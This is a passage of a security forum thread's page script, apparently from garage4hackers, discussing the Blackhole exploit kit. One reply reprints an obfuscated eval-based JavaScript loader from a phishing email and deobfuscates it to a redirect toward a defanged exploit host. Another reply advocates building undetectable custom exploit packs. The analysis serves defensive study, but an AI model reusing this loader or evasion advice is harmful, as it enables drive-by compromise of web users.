Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=61&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=61" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=61" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/61-quot-vinnu-quot" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="&quot;vinnu&quot; is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Researcher\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_8048_61" title="&quot;vinnu&quot; is a jewel in the rough">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=61" title="&quot;vinnu&quot; is offline">\r\n				<img src="image.php?u=61&amp;dateline=1311230253" alt="&quot;vinnu&quot;\'s Avatar" title="&quot;vinnu&quot;\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>271</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=61">4</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_8048">\r\n						<blockquote class="postcontent restore ">\r\n							Namaste<br />\nNice explanation and quite informative.<br />\n<br />\nThe only drawback with Blackhole exploitation kit is that it packs up all the bundled exploits into same file. Such practices should be avoided and it makes exploitation a little lazy in means of transportation overhead. moreover the signature of one bad fish (detected threat -' + '- exploit) can foil whole exploitation process and even zerodays or better ones will also be hammerred by av engines.<br />\n<br />\nThe best way is to use a custom and ur own exploitation pack. They are not so difficult to make; just dont compare everything with metasploit, but a custom one could be more efficient and fast and undetectable and more portable and may include many features  like &quot;anti-analysis payload changer engine&quot; etc according to the scenarios where even metasploit or blackhole or canvas etc doesnt fit.<br />\n<br />\nHope in future we will post some articles on exploitation kit developments.<br />\n<br />\n...&quot;vinnu&quot;\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				<!-' + '- edit note -' + '->\r\n				<blockquote class="postcontent lastedited">\r\n					\r\n						Last edited by &quot;vinnu&quot;; 06-21-2012 at <span class="time">08:50 AM</span>.\r\n					\r\n					\r\n				</blockquote>\r\n				<!-' + '- / edit note -' + '->\r\n				\r\n				\r\n				\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_8048" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_8048" class="newreply" href="newreply.php?do=newreply&amp;p=8048" rel="nofollow" title="Reply With Quote"><img id="quoteimg_8048" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[8049] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_8049">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">06-20-2012,&nbsp;<span class="time">04:37 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post8049" href="showthread.php?t=2250&amp;p=8049&amp;viewfull=1#post8049" class="postcounter">#8</a><a id="postcount8049" name="8"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=2916" title="H@CK3R_ADI is offline"><strong>H@CK3R_ADI</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=2916" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=2916&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=2916" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=2916" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/2916-H-CK3R_ADI" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="H@CK3R_ADI is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Garage Member\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_8049_2916" title="H@CK3R_ADI is on a distinguished road">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jun 2012</dd>\r\n					<dt>Location</dt> <dd>Unkn0wn City,Unkn0wn State,Unkn0wn Country,Unkn0wn Continent,PLanet Eart,Milkyway Galaxy,Virgo Super</dd>\r\n					\r\n					<dt>Posts</dt> <dd>51</dd>	\r\n					\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_8049">\r\n						<blockquote class="postcontent restore ">\r\n							nice post buddy.....love this........keep it up\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_8049" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_8049" class="newreply" href="newreply.php?do=newreply&amp;p=8049" rel="nofollow" title="Reply With Quote"><img id="quoteimg_8049" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[10380] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_10380">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">04-05-2013,&nbsp;<span class="time">08:15 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post10380" href="showthread.php?t=2250&amp;p=10380&amp;viewfull=1#post10380" class="postcounter">#9</a><a id="postcount10380" name="9"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=191" title="abhaythehero is offline"><strong>abhaythehero</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=191" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=191&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=191" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=191" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="https://twitter.com/#!/abhaythehero" class="siteicon_homepage">\r\n				Visit Homepage\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/191-abhaythehero" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="abhaythehero is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Super Commando Dhruv\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_10380_191" title="abhaythehero has a spectacular aura about">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=191" title="abhaythehero is offline">\r\n				<img src="image.php?u=191&amp;dateline=1330713871" alt="abhaythehero\'s Avatar" title="abhaythehero\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Sep 2010</dd>\r\n					<dt>Location</dt> <dd>Lucknow/Pune,India</dd>\r\n					\r\n					<dt>Posts</dt> <dd>466</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=191">2</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_10380">\r\n						<blockquote class="postcontent restore ">\r\n							I encountered a similar obfuscated javascript in a phishing e-mail which led to blackhole exploit kit. <br />\n<div class="bbcode_container">\r\n	<div class="bbcode_description">HTML Code:</div>\r\n	<pre class="bbcode_code" style="height:3*12px};">try{if(window.document)window&#91;&quot;doc&quot;+&quot;ument&quot;&#93;&#91;&quot;body&quot;&#93;=window.document}catch(bawetawe){if(window.document){v=window;try{fawbe-' + '-}catch(afnwenew){try{(v+v)()}catch(gngrthn){try{if(020===0x10)v&#91;&quot;document&quot;&#93;&#91;&quot;bo&quot;+&quot;dy&quot;&#93;=&quot;123&quot;}catch(gfdnfdgber){m=123;if(&quot;&quot;.substr)ev=eval;}} n=&#91;&quot;4i&quot;,&quot;3m&quot;,&quot;4e&quot;,&quot;1o&quot;,&quot;2b&quot;,&quot;22&quot;,&quot;27&quot;,&quot;29&quot;,&quot;a&quot;,&quot;4i&quot;,&quot;3m&quot;,&quot;4e&quot;,&quot;20&quot;,&quot;2b&quot;,&quot;4i&quot;,&quot;3m&quot;,&quot;4e&quot;,&quot;1o&quot;,&quot;29&quot;,&quot;a&quot;,&quot;45&quot;,&quot;42&quot;,&quot;1f&quot;,&quot;4i&quot;,&quot;3m&quot;,&quot;4e&quot;,&quot;1o&quot;,&quot;2b&quot;,&quot;2b&quot;,&quot;4i&quot;,&quot;3m&quot;,&quot;4e&quot;,&quot;20&quot;,&quot;1g&quot;,&quot;17&quot;,&quot;4n&quot;,&quot;40&quot;,&quot;4b&quot;,&quot;3o&quot;,&quot;4h&quot;,&quot;49&quot;,&quot;41&quot;,&quot;4a&quot;,&quot;4g&quot;,&quot;1l&quot;,&quot;48&quot;,&quot;4b&quot;,&quot;3o&quot;,&quot;3m&quot;,&quot;4g&quot;,&quot;45&quot;,&quot;4b&quot;,&quot;4a&quot;,&quot;2b&quot;,&quot;19&quot;,&quot;44&quot;,&quot;4g&quot;,&quot;4g&quot;,&quot;4c&quot;,&quot;28&quot;,&quot;1m&quot;,&quot;1m&quot;,&quot;3m&quot;,&quot;4a&quot;,&quot;3m&quot;,&quot;48&quot;,&quot;4h&quot;,&quot;4a&quot;,&quot;3m&quot;,&quot;47&quot;,&quot;45&quot;,&quot;4f&quot;,&quot;1l&quot;,&quot;4e&quot;,&quot;4h&quot;,&quot;28&quot;,&quot;26&quot;,&quot;1n&quot;,&quot;26&quot;,&quot;1n&quot;,&quot;1m&quot;,&quot;42&quot;,&quot;4b&quot;,&quot;4e&quot;,&quot;4h&quot;,&quot;49&quot;,&quot;1m&quot;,&quot;48&quot;,&quot;45&quot;,&quot;4a&quot;,&quot;47&quot;,&quot;4f&quot;,&quot;1m&quot;,&quot;3o&quot;,&quot;4b&quot;,&quot;48&quot;,&quot;4h&quot;,&quot;49&quot;,&quot;4a&quot;,&quot;1l&quot;,&quot;4c&quot;,&quot;44&quot;,&quot;4c&quot;,&quot;19&quot;,&quot;29&quot;,&quot;50&quot;&#93;;h=2;s=&quot;&quot;;if(m)for(i=0;i-106!=0;i++){k=i;if(window&#91;&quot;document&quot;&#93;)s+=String.fromCharCode(parseInt(n&#91;i&#93;,25));}z=s;if(window.document)ev(&quot;&quot;+z)}}}</pre>\r\n</div>The first step, as mentioned by c0d3inj3cT in one of his papers, was to make the code indented (i.e. neatly spread it out and give proper spaces and tabs to braces/functions). <br />\n<br />\nAlso String addition can be done to make one string. &quot;bo&quot;+&quot;dy&quot; becomes &quot;body&quot;. &quot;doc&quot;+&quot;ument&quot; becomes &quot;document&quot;<br />\n<div class="bbcode_container">\r\n	<div class="bbcode_description">HTML Code:</div>\r\n	<pre class="bbcode_code" style="height:32*12px};">\n<span style="color:#800000">&lt;script&gt;</span>\ntry\n{\n   if(window.document)window&#91;&quot;document&quot;&#93;&#91;&quot;body&quot;&#93;=window.document\n}\n\ncatch (bawetawe)\n{\n   if(window.document)\n   {\n     v=window;\n     try\n      {\n       fawbe-' + '-\n      }\n     catch(afnwenew)\n      {\n         try\n         {\n          (v+v)()\n         }\n         catch(gngrthn)\n         {\n               try\n              {\n                if(020===0x10)v&#91;&quot;document&quot;&#93;&#91;&quot;body&quot;&#93;=&quot;123&quot;\n              }\n              catch(gfdnfdgber)\n              {\n                m=123;\n                if(&quot;&quot;.substr)ev=eval;\n              }\n         } \nn=   &#91;&quot;4i&quot;,&quot;3m&quot;,&quot;4e&quot;,&quot;1o&quot;,&quot;2b&quot;,&quot;22&quot;,&quot;27&quot;,&quot;29&quot;,&quot;a&quot;,&quot;4i&quot;,&quot;3m&quot;,&quot;4e&quot;,&quot;20&quot;,&quot;2b&quot;,&quot;4i&quot;,&quot;3m&quot;,&quot;4e&quot;,&quot;1o&quot;,&quot;29&quot;,&quot;a&quot;,&quot;45&quot;,&quot;42&quot;,&quot;1f&quot;,&quot;4i&quot;,&quot;3m&quot;,&quot;4e&quot;,&quot;1o&quot;,&quot;2b&quot;,&quot;2b&quot;,&quot;4i&quot;,&quot;3m&quot;,&quot;4e&quot;,&quot;20&quot;,&quot;1g&quot;,&quot;17&quot;,&quot;4n&quot;,&quot;40&quot;,&quot;4b&quot;,&quot;3o&quot;,&quot;4h&quot;,&quot;49&quot;,&quot;41&quot;,&quot;4a&quot;,&quot;4g&quot;,&quot;1l&quot;,&quot;48&quot;,&quot;4b&quot;,&quot;3o&quot;,&quot;3m&quot;,&quot;4g&quot;,&quot;45&quot;,&quot;4b&quot;,&quot;4a&quot;,&quot;2b&quot;,&quot;19&quot;,&quot;44&quot;,&quot;4g&quot;,&quot;4g&quot;,&quot;4c&quot;,&quot;28&quot;,&quot;1m&quot;,&quot;1m&quot;,&quot;3m&quot;,&quot;4a&quot;,&quot;3m&quot;,&quot;48&quot;,&quot;4h&quot;,&quot;4a&quot;,&quot;3m&quot;,&quot;47&quot;,&quot;45&quot;,&quot;4f&quot;,&quot;1l&quot;,&quot;4e&quot;,&quot;4h&quot;,&quot;28&quot;,&quot;26&quot;,&quot;1n&quot;,&quot;26&quot;,&quot;1n&quot;,&quot;1m&quot;,&quot;42&quot;,&quot;4b&quot;,&quot;4e&quot;,&quot;4h&quot;,&quot;49&quot;,&quot;1m&quot;,&quot;48&quot;,&quot;45&quot;,&quot;4a&quot;,&quot;47&quot;,&quot;4f&quot;,&quot;1m&quot;,&quot;3o&quot;,&quot;4b&quot;,&quot;48&quot;,&quot;4h&quot;,&quot;49&quot;,&quot;4a&quot;,&quot;1l&quot;,&quot;4c&quot;,&quot;44&quot;,&quot;4c&quot;,&quot;19&quot;,&quot;29&quot;,&quot;50&quot;&#93;;\n\nh=2;s=&quot;&quot;;\n\nif(m)for(i=0;i-106!=0;i++)\n  { \n    k=i;\n    if(window&#91;&quot;document&quot;&#93;)s+=String.fromCharCode(parseInt(n&#91;i&#93;,25));\n  }\n\nz=s;\nif(window.document)ev(&quot;&quot;+z)\n   }\n  }\n}\n\n<span style="color:#800000">&lt;/script&gt;</span></pre>\r\n</div>Code is filled with useless try catch statements to confuse the researcher. The final catch will be executed in this code. All the above code is useless and only sets the value of m = 123. One very good tip by c0d3inj3cT was to run individual statements inside web javascript console of Firefox and check whether the statement is evaluating to true/false or the statement is throwing some exception or being executed without exception.<br />\n<br />\nFor example : <div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:36px;">window[&quot;document&quot;][&quot;body&quot;]=window.document</pre>\r\n</div> will always throw exception, and code will go to catch block.<br />\n<br />\n<br />\n<br />\n<div class="bbcode_container">\r\n	<div class="bbcode_description">HTML Code:</div>\r\n	<pre class="bbcode_code" style="height:32*12px};"><span style="color:#800000">&lt;script&gt;</span>\ntry\n{\n   if(window.document)window&#91;&quot;document&quot;&#93;&#91;&quot;body&quot;&#93;=window.document\n}\n\ncatch (bawetawe)\n{\n   if(window.document)\n   {\n     v=window;\n     try\n      {\n       fawbe-' + '-\n      }\n     catch(afnwenew)\n      {\n         try\n         {\n          (v+v)()\n         }\n         catch(gngrthn)\n         {\n               try\n              {\n                if(020===0x10)v&#91;&quot;document&quot;&#93;&#91;&quot;body&quot;&#93;=&quot;123&quot;\n              }\n              catch(gfdnfdgber)\n              {\n                m=123;\n                if(&quot;&quot;.substr)ev=eval;\n              }\n         } \nn=   &#91;&quot;4i&quot;,&quot;3m&quot;,&quot;4e&quot;,&quot;1o&quot;,&quot;2b&quot;,&quot;22&quot;,&quot;27&quot;,&quot;29&quot;,&quot;a&quot;,&quot;4i&quot;,&quot;3m&quot;,&quot;4e&quot;,&quot;20&quot;,&quot;2b&quot;,&quot;4i&quot;,&quot;3m&quot;,&quot;4e&quot;,&quot;1o&quot;,&quot;29&quot;,&quot;a&quot;,&quot;45&quot;,&quot;42&quot;,&quot;1f&quot;,&quot;4i&quot;,&quot;3m&quot;,&quot;4e&quot;,&quot;1o&quot;,&quot;2b&quot;,&quot;2b&quot;,&quot;4i&quot;,&quot;3m&quot;,&quot;4e&quot;,&quot;20&quot;,&quot;1g&quot;,&quot;17&quot;,&quot;4n&quot;,&quot;40&quot;,&quot;4b&quot;,&quot;3o&quot;,&quot;4h&quot;,&quot;49&quot;,&quot;41&quot;,&quot;4a&quot;,&quot;4g&quot;,&quot;1l&quot;,&quot;48&quot;,&quot;4b&quot;,&quot;3o&quot;,&quot;3m&quot;,&quot;4g&quot;,&quot;45&quot;,&quot;4b&quot;,&quot;4a&quot;,&quot;2b&quot;,&quot;19&quot;,&quot;44&quot;,&quot;4g&quot;,&quot;4g&quot;,&quot;4c&quot;,&quot;28&quot;,&quot;1m&quot;,&quot;1m&quot;,&quot;3m&quot;,&quot;4a&quot;,&quot;3m&quot;,&quot;48&quot;,&quot;4h&quot;,&quot;4a&quot;,&quot;3m&quot;,&quot;47&quot;,&quot;45&quot;,&quot;4f&quot;,&quot;1l&quot;,&quot;4e&quot;,&quot;4h&quot;,&quot;28&quot;,&quot;26&quot;,&quot;1n&quot;,&quot;26&quot;,&quot;1n&quot;,&quot;1m&quot;,&quot;42&quot;,&quot;4b&quot;,&quot;4e&quot;,&quot;4h&quot;,&quot;49&quot;,&quot;1m&quot;,&quot;48&quot;,&quot;45&quot;,&quot;4a&quot;,&quot;47&quot;,&quot;4f&quot;,&quot;1m&quot;,&quot;3o&quot;,&quot;4b&quot;,&quot;48&quot;,&quot;4h&quot;,&quot;49&quot;,&quot;4a&quot;,&quot;1l&quot;,&quot;4c&quot;,&quot;44&quot;,&quot;4c&quot;,&quot;19&quot;,&quot;29&quot;,&quot;50&quot;&#93;;\n\n        h=2;s=&quot;&quot;;\n\n        if(m)\n           {\n             for(i=0;i-106!=0;i++)\n               { \n                 k=i;\n                if(window&#91;&quot;document&quot;&#93;)s+=String.fromCharCode(parseInt(n&#91;i&#93;,25));\n               }\n           }\nz=s;\nif(window.document)ev(&quot;&quot;+z)\n   }\n  }\n}\n\n<span style="color:#800000">&lt;/script&gt;</span></pre>\r\n</div>The final ev evaluates to eval. The eval runs the code which would be generated by for loop on iterating over variable n.<br />\n<br />\nNow we can easily replace eval by alert to instruct the javascript interpreter not to run the outcome of the block, but to pop up the outcome result in browser window. This is because most of the times the obfuscated code block is arranged at run time by the malicious code itself and then this de-obfuscated code is run by the eval. This whole drama is of-course to evade AVs and normal eye detection.<br />\n<br />\n<br />\n<div class="bbcode_container">\r\n	<div class="bbcode_description">HTML Code:</div>\r\n	<pre class="bbcode_code" style="height:18*12px};">\n\n         n=   &#91;&quot;4i&quot;,&quot;3m&quot;,&quot;4e&quot;,&quot;1o&quot;,&quot;2b&quot;,&quot;22&quot;,&quot;27&quot;,&quot;29&quot;,&quot;a&quot;,&quot;4i&quot;,&quot;3m&quot;,&quot;4e&quot;,&quot;20&quot;,&quot;2b&quot;,&quot;4i&quot;,&quot;3m&quot;,&quot;4e&quot;,&quot;1o&quot;,&quot;29&quot;,&quot;a&quot;,&quot;45&quot;,&quot;42&quot;,&quot;1f&quot;,&quot;4i&quot;,&quot;3m&quot;,&quot;4e&quot;,&quot;1o&quot;,&quot;2b&quot;,&quot;2b&quot;,&quot;4i&quot;,&quot;3m&quot;,&quot;4e&quot;,&quot;20&quot;,&quot;1g&quot;,&quot;17&quot;,&quot;4n&quot;,&quot;40&quot;,&quot;4b&quot;,&quot;3o&quot;,&quot;4h&quot;,&quot;49&quot;,&quot;41&quot;,&quot;4a&quot;,&quot;4g&quot;,&quot;1l&quot;,&quot;48&quot;,&quot;4b&quot;,&quot;3o&quot;,&quot;3m&quot;,&quot;4g&quot;,&quot;45&quot;,&quot;4b&quot;,&quot;4a&quot;,&quot;2b&quot;,&quot;19&quot;,&quot;44&quot;,&quot;4g&quot;,&quot;4g&quot;,&quot;4c&quot;,&quot;28&quot;,&quot;1m&quot;,&quot;1m&quot;,&quot;3m&quot;,&quot;4a&quot;,&quot;3m&quot;,&quot;48&quot;,&quot;4h&quot;,&quot;4a&quot;,&quot;3m&quot;,&quot;47&quot;,&quot;45&quot;,&quot;4f&quot;,&quot;1l&quot;,&quot;4e&quot;,&quot;4h&quot;,&quot;28&quot;,&quot;26&quot;,&quot;1n&quot;,&quot;26&quot;,&quot;1n&quot;,&quot;1m&quot;,&quot;42&quot;,&quot;4b&quot;,&quot;4e&quot;,&quot;4h&quot;,&quot;49&quot;,&quot;1m&quot;,&quot;48&quot;,&quot;45&quot;,&quot;4a&quot;,&quot;47&quot;,&quot;4f&quot;,&quot;1m&quot;,&quot;3o&quot;,&quot;4b&quot;,&quot;48&quot;,&quot;4h&quot;,&quot;49&quot;,&quot;4a&quot;,&quot;1l&quot;,&quot;4c&quot;,&quot;44&quot;,&quot;4c&quot;,&quot;19&quot;,&quot;29&quot;,&quot;50&quot;&#93;;\n\n        h=2;s=&quot;&quot;;\n\n       \n             for(i=0;i-106!=0;i++)\n               { \n                 k=i;\n                if(window&#91;&quot;document&quot;&#93;)s+=String.fromCharCode(parseInt(n&#91;i&#93;,25));\n               }\n           \n\nif(window.document)alert(s)\n  </pre>\r\n</div>Running the above in a browser as javascript of html file(or using web console of firefox) will give you <br />\n<br />\n<div class="bbcode_container">\r\n	<div class="bbcode_description">HTML Code:</div>\r\n	<pre class="bbcode_code" style="height:5*12px};">var1=49;\nvar2=var1;\nif(var1==var2) {document.location=&quot;hxxp://somelink.com&quot; ;}</pre>\r\n</div>Now you know the victim is being redirected to this site which was hosting the blackhole exploit kit <img src="images/smilies/wink.png" border="0" alt="" title="Wink" class="inlineimg" />\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				<!-' + '- edit note -' + '->\r\n				<blockquote class="postcontent lastedited">\r\n					\r\n						Last edited by abhaythehero; 04-06-2013 at <span class="time">10:38 AM</span>.\r\n					\r\n					\r\n				</blockquote>\r\n				<!-' + '- / edit note -' + '->\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer"><b><i>In the world of 0s and 1s, are you a zero or The One !</i></b></div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_10380" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_10380" class="newreply" href="newreply.php?do=newreply&amp;p=10380" rel="nofollow" title="Reply With Quote"><img id="quoteimg_10380" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+
+// next/previous post info
+pn[7663] = "10380,7664";
+pn[0] = ",7663";
+pn[7664] = "7663,7665";
+pn[7665] = "7664,7666";
+pn[7666] = "7665,7674";
+pn[7674] = "7666,7814";
+pn[7814] = "7674,8048";
+pn[8048] = "7814,8049";
+pn[8049] = "8048,10380";
+pn[10380] = "8049,7663";
+
+// cached usernames
+pu[0] = guestphrase;
+pu[311] = "c0d3inj3cT";
+pu[8] = "fb1h2s";
+pu[18] = "prashant_uniyal";
+pu[61] = "&quot;vinnu&quot;";
+pu[2916] = "H@CK3R_ADI";
+pu[191] = "abhaythehero";
+
+// -->
+</script>
+
+
+<div id="threaded_view">
+	<h4>Threaded View</h4>
+
+	<div id="posttree">
+		<script type="text/javascript">
+		<!--
+			writeLink(7663, 0, 0, 311, "", "Blackhole Exploit Kit", "04-30-2012", "11:03 AM", 0, "showthread370b-2.html?t=2250&amp;p=7663#post7663");
+  writeLink(7664, 0, 0, 311, "T", "<i>We will start with the JS...</i>", "04-30-2012", "11:11 AM", 0, "showthreadee16.html?t=2250&amp;p=7664#post7664");
+  writeLink(7665, 0, 0, 311, "T", "<i>A snippet of the first few...</i>", "04-30-2012", "11:42 AM", 0, "showthreadcbdb.html?t=2250&amp;p=7665#post7665");
+  writeLink(7666, 0, 0, 311, "T", "<i>Using the steps mentioned in...</i>", "04-30-2012", "12:22 PM", 0, "showthreade8cd.html?t=2250&amp;p=7666#post7666");
